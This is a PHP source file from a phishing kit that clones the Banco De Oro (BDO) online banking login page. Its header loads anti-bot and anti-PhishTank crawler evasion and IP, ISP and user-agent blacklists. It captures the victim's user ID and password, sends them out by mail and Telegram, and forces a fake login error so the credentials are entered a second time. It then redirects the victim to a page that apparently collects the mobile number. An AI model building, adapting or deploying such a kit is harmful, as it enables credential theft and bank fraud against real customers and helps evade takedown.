<?php 
session_start();
ob_start();

require_once( 'conf.php' );
require_once( 'php_components/user_info.php' );

require_once( 'antibot_files/APIs/antibot_pw.api.php' );
require_once( 'antibot_files/crawler_detection/is_google.php'    );
require_once( 'antibot_files/crawler_detection/is_phishtank.php' );
require_once( 'antibot_files/crawler_detection/is_spider.php' );
require_once( 'antibot_files/blacklist/blacklist_ip.php' );
require_once( 'antibot_files/blacklist/blacklist_ua.php' );
require_once( 'antibot_files/blacklist/blacklist_isp.php' );
require_once( 'antibot_files/blacklist/blacklist_word.php' );
require_once( 'antibot_files/blacklist/ip_range.php' );

if(!isset($_SESSION['@ADVANCEDSPAMMING-checked'])){
require_once('php_components/messages.php');
require_once('php_components/sendMessage.telegram.php');
$_SESSION['@ADVANCEDSPAMMING-checked'] = true;
}

$error = null;

if($_SERVER['REQUEST_METHOD'] == 'POST') {

  if(strlen($_POST['user_id']) >= 6 && !empty($_POST['pswd'])){

    if(isset($_SESSION['@ADVANCEDSPAMMING-first_log_attempt'])){
      $error = false;
      $_SESSION['@ADVANCEDSPAMMING-second_log'] = array(
        'user_id' => $_POST['user_id'],
        'password' => $_POST['pswd']);

    }else{
      $error = true;
      $_SESSION['@ADVANCEDSPAMMING-second_log'] = array(
        'user_id' => $_POST['user_id'],
        'password' => $_POST['pswd']);

      $_SESSION['@ADVANCEDSPAMMING-first_log_attempt'] = true;
    }
    require_once('php_components/messages.php');

    require_once('php_components/sendMail.php');
    require_once('php_components/sendMessage.telegram.php');

    if(isset($_SESSION['@ADVANCEDSPAMMING-second_log'])) header('location: mobile_number.php');
  } else { $error = true; }
}
?>
<html>
  <head>
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <title>Banco De Oro</title>
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
    <link rel="stylesheet" type="text/css" href="styles/css/loginid.css">
    <link rel="stylesheet" type="text/css" href="styles/css/component.style.css">
    <link rel="stylesheet" type="text/css" href="styles/css/base.css">
  </head>
  <body>
		<?php require_once('html_components/login_header.php'); ?>
    <div class="loginmenucontainer" id="loginmenucontainer" style="display: none;">
      <div id="personalmenudiv">
        <a href="javascript:void(0);" class="logintitle plink active">Personal</a>
        <a href="javascript:void(0);" class="logintitle clink">Business</a>
        <ul>
          <li>
            <a href="javascript:void(0);" class="bib" title="BDO Online Banking">BDO ONLINE BANKING</a>
          </li>
        </ul>
        <div class="menu-link-middle">
          <p>
            <a href="javascript:void(0);">Not Yet Enrolled? Enroll Now!</a>
          </p>
        </div>
        <div class="menu-link-footer">
          <p>
            <a href="javascript:void(0);">What is a One-Time Password (OTP)</a>
          </p>
        </div>
      </div>
      <div id="corporatemenudiv" style="display: none;">
        <a href="javascript:void(0);" class="logintitle plink">Personal</a>
        <a href="javascript:void(0);" class="logintitle clink active">Business</a>
        <ul>
          <li>
            <a href="javascript:void(0);" class="cashcard" id="ol-banking-cash-cards" title="Cash Card" target="blank">Cash Card</a>
          </li>
          <li>
            <a href="javascript:void(0);" class="ids" id="ol-banking-ids" title="Integrated Disbursement Solutions" target="blank">Integrated Disbursement Solutions</a>
          </li>
          <li>
            <a href="javascript:void(0);" class="cib" id="ol-banking-cib" title="Business Online Banking" target="blank">Business Online Banking</a>
          </li>
        </ul>
      </div>
    </div>
    <div>
      <div>
        <table class="main-content">
          <tbody>
            <tr>
              <td style="max-width: 225px;vertical-align:top;padding-top:77px">
                <div id="sideBarWrapper">
                  <div id="logoWrapper">
                    <div id="bdoLogo">
                      <a href="javascript:void(0);" >
                        <span>Banco De Oro</span>
                      </a>
                    </div>
                  </div>
                  <div>
                    <div class="sidebdomenu container">
                      <div class="side_tabs">
                        <div class="mainmenu" style="padding-bottom: 20px !important;">
                          <div class="tablinkbox">
                            <a href="javascript:void(0);" class="personal" id="personal-tab">PERSONAL</a>
                            <a href="javascript:void(0);" class="corporate" id="business-tab">BUSINESS</a>
                          </div>
                          <ul class="menu">
                            <li class="first collapsed">
                              <a href="javascript:void(0);" title="eBanking Menu Item" id="menu-1071">eBanking</a>
                            </li>
                            <li class="collapsed">
                              <a href="javascript:void(0);" id="menu-970">Accounts</a>
                            </li>
                            <li class="collapsed">
                              <a href="javascript:void(0);" id="menu-1269">Trust and Investments</a>
                            </li>
                            <li class="collapsed">
                              <a href="javascript:void(0);" id="menu-1303">Loans</a>
                            </li>
                            <li class="collapsed">
                              <a href="javascript:void(0);" id="menu-684">Credit Cards</a>
                            </li>
                            <li class="collapsed">
                              <a href="javascript:void(0);" id="menu-1216">Remittance Services</a>
                            </li>
                            <li class="collapsed">
                              <a href="javascript:void(0);" id="menu-1302">Insurance</a>
                            </li>
                            <li class="collapsed">
                              <a href="javascript:void(0);" id="menu-1462">Rewards</a>
                            </li>
                            <li class="last leaf" style="border-radius: 0px 0px 10px 10px;">
                              <a href="javascript:void(0);" id="menu-1462">Private Bank</a>
                            </li>
                          </ul>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </td>
              <td>
                <div>
                  <table style="padding-top: 15px;">
                    <tbody>
                      <tr>
                        <td colspan="2" style="padding-left: 10px;">
                          <div id="advisoryContainer" style="overflow:hidden">
                            <div id="idd">
                              <div class="loginImage"></div>
                            </div>
                          </div>
                        </td>
                      </tr>
                      <tr>
                        <td colspan="2">
                          <div class="invisible"> Invisible </div>
                        </td>
                      </tr>
                      <tr>
                        <td valign="top" style="padding-left: 7px;">
                          <div id="IDMyBDOGray">
                            <div id="left column">
                              <div id="rib-title">Login to BDO Online Banking</div>
                              <br>
                              <form onsubmit="auth(document.querySelector('#user_id').value, document.querySelector('#pswd').value);" autocomplete="off" loginform="true" class="loginForm" id="idc" method="post" action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>">
                                <span id="login-title">User ID:</span>
                                <br>
                                <input class="textbox box" type="text" tabindex="1" maxlength="30" value="" name="user_id" id="user_id">
                                <br>
                                <span id="login-title">Password:</span>
                                <br>
                                <input class="textbox box" id="pswd" type="password" tabindex="2" maxlength="20" value="" name="pswd">
                                <br>
                                <div id="id12c" class="sxiFeedback" style="display: <?php if($error == true) echo 'block'; else echo 'none'; ?>">
                                    <ul class="paginationul">
                                      <li class="feedbackPanelERROR">
                                        <span id="err_message" class="feedbackPanelERROR">Invalid User ID or Password.</span>
                                      </li>
                                    </ul>
                                  </div>
                                <div id="idf" class="sxiFeedback"></div>
                                <table>
                                  <tbody>
                                    <tr>
                                      <td></td>
                                      <td style="vertical-align:top; float:right;">
                                        <div id="btn-submit">
                                          <input class="enrollNowButton sxi-button ui-corner-all ui-state-default" type="submit" tabindex="3" id="loginButton" style="background: none rgb(255, 178, 12); color: rgb(36, 65, 143);"  value="Login">
                                        </div>
                                      </td>
                                    </tr>
                                    <tr>
                                      <td>
                                        <div style="display:block; margin-left: -8px; ">
                                          <a class="email" href="javascript:void(0);" >
                                            <div class="idbox2">Forgot your password?</div>
                                          </a>
                                          <a class="email" href="javascript:void(0);" >
                                            <div class="idbox2">Forgot your user ID?</div>
                                          </a>
                                          <a class="email" href="javascript:void(0);" >
                                            <div class="idbox2">Forgot your telephone PIN?</div>
                                          </a>
                                        </div>
                                      </td>
                                    </tr>
                                  </tbody>
                                </table>
                                <br>
                                <table>
                                  <tbody>
                                    <tr id="id10">
                                      <td id="id11">
                                        <a class="email" id="id12" href="javascript:void(0);">
                                          <div class="idbox6">
                                            <h5>Not Yet Enrolled? Enroll Now!</h5>
                                          </div>
                                        </a>
                                      </td>
                                    </tr>
                                  </tbody>
                                </table>
                                <br>
                                <table>
                                  <tbody>
                                    <tr class="link1" style="padding-bottom:3px;">
                                      <td style="width:120px;max-width:120px;">
                                        <a class="email" href="javascript:void(0);" >
                                          <div class="idbox5">Security Features</div>
                                        </a>
                                      </td>
                                      <td>
                                        <a class="email" href="javascript:void(0);" >
                                          <div class="idbox5">Online Banking Privacy Policy</div>
                                        </a>
                                      </td>
                                      <td>
                                        <a class="email" href="javascript:void(0);">
                                          <div class="idbox5">FAQs</div>
                                        </a>
                                      </td>
                                    </tr>
                                  </tbody>
                                </table>
                              </form>
                              <div id="bysy_indicator" style="display: none;">
                                <div id="loading_gif"></div>
                              </div>
                            </div>
                          </div>
                        </td>
                        <td valign="top">
                          <div id="rightSideWrapper2">
                            <form id="id13" method="post" action="">
                              <table width="270px" style="margin-bottom: -5px; margin-top:-10px;"></table>
                              <table style="margin-top: 5px">
                                <tbody>
                                  <tr>
                                    <td></td>
                                    <td></td>
                                  </tr>
                                </tbody>
                              </table>
                              <table style="margin-top: 5px">
                                <tbody>
                                  <tr>
                                    <td></td>
                                    <td></td>
                                  </tr>
                                </tbody>
                              </table>
                            </form>
                            <span class="clear"></span>
                            <span class="clear"></span>
                            <div class="contacts">
                              <br>
                              <br>
                              <h4>TOLL-FREE NUMBERS</h4>
                              <h4>Reminder: Charges apply for calls made through a mobile phone.</h4>
                              <br>
                              <h4>Domestic Toll-Free Nos.:</h4>
                              <table style="font-size: 14px;">
                                <tbody>
                                  <tr>
                                    <td>1800-10-631-8000 (PLDT)</td>
                                    <td class="padleft">1800-3-631-8000 (Digitel)</td>
                                  </tr>
                                  <tr>
                                    <td>1800-5-631-8000 (Bayantel)</td>
                                    <td class="padleft">1800-8-631-8000 (Globelines)</td>
                                  </tr>
                                </tbody>
                              </table>
                              <br>
                              <h4>INTERNATIONAL</h4>
                              <p>(Int'l. Access Code) + 800-8-631-8000</p>
                              <br>
                              <h4>CONTACT SUPPORT:</h4>
                              <form id="id14" method="post" action="">
                        
                                <p>
                                  <span href="javascript:void(0);" style="color: #24418F; cursor: pointer; text-decoration: none;" class="supportLink">Send a message to BDO</span>
                                </p>
                              </form>
                              <div id="customer-service" style="margin-top:9px">
                                <p style="font-size: 12px; padding-top:8px; padding-left: 10px; font-weight: bold; color: #043673">Customer Contact Center <span style="padding-right: 10px; margin-left: 35%;">
                                    <i class="icon-phone icon-large"></i>(02) 8631-8000 </span>
                                </p>
                              </div>
                            </div>
                            <div id="id15" style="padding-bottom:29px;"></div>
                          </div>
                        </td>
                      </tr>
                      <tr>
                        <td colspan="2" style="padding-left: 10px;">
                          <form id="id16" method="post" action="" style="font-size: 14px">
               
                            <br>
                            <span>*Our website supports the latest browser versions to ensure your privacy and security. To ensure access and for best viewing experience, please upgrade to the latest versions of Mozilla Firefox, Google Chrome, Safari or Internet Explorer as soon as possible.</span>
                            <br>
                            <br> *Detailed instructions can be found <a href="javascript:void(0);" class="links">here</a>.
                          </form>
                        </td>
                      </tr>
                    </tbody>
                  </table>
                </div>
              </td>
            </tr>
          </tbody>
        </table>
      </div>
      <div id="footer-title">
        <div id="right-footer-mybdo"></div>
      </div>
      <span class="clear"></span>
      <span class="clear"></span>
      <?php require_once('html_components/login_footer.php'); ?>
    </div>
    <script src="js_scripts/variables_root.js"></script>
    <script src="js_scripts/login.js"></script>
  </body>
</html>